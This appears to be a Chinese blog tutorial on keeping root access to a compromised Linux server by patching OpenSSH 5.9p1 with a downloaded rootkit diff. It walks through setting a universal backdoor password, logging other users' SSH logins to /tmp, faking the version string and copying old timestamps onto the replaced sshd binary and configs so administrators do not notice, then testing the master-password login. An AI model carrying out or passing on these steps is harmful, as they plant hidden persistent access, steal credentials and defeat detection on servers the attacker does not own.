当我们在获得一台Linux服务器的 root 权限后，我们第一想做的就是如何维持这个权限，维持权限肯定想到的就是在目标服务器留下一个后门。但是留普通后门，肯定很容易被发现。我们今天要讲的就是留一个[SSH](https://so.csdn.net/so/search?q=SSH&spm=1001.2101.3001.7020)后门，是通过修改SSH源代码的方式来留一个万能的SSH密码。

**环境：**

![](https://img-blog.csdnimg.cn/20190718221501122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

软件包准备：

*   [openssh-5.9p1.tar.gz](http://ifuryst.com/usr/uploads/data/openssh-5.9p1.tar.gz)           （正常的openssh包）
*   [openssh-5.9p1.patch.tar.gz](http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz)   (补丁包)

首先查看一下SSH的版本号，记录下来

```
ssh -V
```


![](https://img-blog.csdnimg.cn/20190719110639506.png)

安装依赖包：

```
yum -y install openssl openssl-devel pam-devel zlib zlib-devel
```


![](https://img-blog.csdnimg.cn/20190719142346129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

重命名原来的ssh主程序和配置文件(作用是待会同步时间)

```
mv /etc/ssh/ssh_config   /etc/ssh/ssh_config.bank      
mv /etc/ssh/sshd_config  /etc/ssh/sshd_config.bank      
mv /usr/sbin/sshd        /usr/sbin/sshd.bank
```


![](https://img-blog.csdnimg.cn/20190719143107802.png)

 将软件包上传到根目录，并解压

```
tar -xzvf   openssh-5.9p1.patch.tar.gz      
tar -xzvf   openssh-5.9p1.tar.gz
```


![](https://img-blog.csdnimg.cn/2019071914324996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
cp openssh-5.9p1.patch/sshbd5.9p1.diff  openssh-5.9p1  #移动补丁文件中的diff文件到正常ssh目录      
cd openssh-5.9p1                  #进入ssh正常目录      
patch < sshbd5.9p1.diff           #打补丁
```


![](https://img-blog.csdnimg.cn/20190719143448920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

修改后门密码和版本信息

```
vim includes.h
```


SECRETPW 这里是万能密码，ILOG是别人用ssh登录该主机记录的日志目录，OLOG是该主机用ssh登录其他主机记录的日志目录 

![](https://img-blog.csdnimg.cn/20190719143728175.png)

```
vim version.h
```


将这里的版本号修改为刚开始使用ssh -V 查看的，避免被管理员发现 

![](https://img-blog.csdnimg.cn/20190719213301726.png)

重新编译安装

```
./configure --prefix=/usr  --sysconfdir=/etc/ssh  --with-pam  --with-kerberos5  && make && make install
```


![](https://img-blog.csdnimg.cn/20190719144126713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果这里出现了这个错误，是因为没有安装gcc编译库等编译环境

```
yum -y install gcc gcc-c++ make  #安装编译环境
```


安装了编译库环境后，重新编译安装，如果看到以下就说明编译成功

![](https://img-blog.csdnimg.cn/20190719144443106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

现在我们还要做的就是修改sshd程序和配置文件的时间，避免被管理员发现sshd程序发生了修改

```
touch -r ssh_config.bank ssh_config      
touch -r sshd_config.bank sshd_config      
touch -r /usr/sbin/sshd.bank /usr/sbin/sshd
```


![](https://img-blog.csdnimg.cn/20190719144842755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

重启sshd服务

```
service sshd restart   #重启sshd服务      
ssh -V       #查看版本号
```


![](https://img-blog.csdnimg.cn/20190719145357631.png)

使用其他主机SSH登录该主机，使用万能密码 xie 看能否成功登录，如下登录成功！

![](https://img-blog.csdnimg.cn/20190719151623465.png)

在/tmp目录下会生成ilog和olog日志，当其他主机ssh登录该主机时(使用万能密码登录的不会记录)，会生成ilog日志，当该主机ssh登录其他主机时，会生成olog日志。

![](https://img-blog.csdnimg.cn/20190719150856768.png)

参考文章： [OpenSSH后门获取root密码及防范](https://www.cnblogs.com/croso/p/5280783.html)

                   [利用Openssh后门 劫持root密码](https://www.cnblogs.com/bigdevilking/p/9535427.html)

相关文章：[OpenSSH万能后门](https://blog.csdn.net/Aixixxx/article/details/104399536)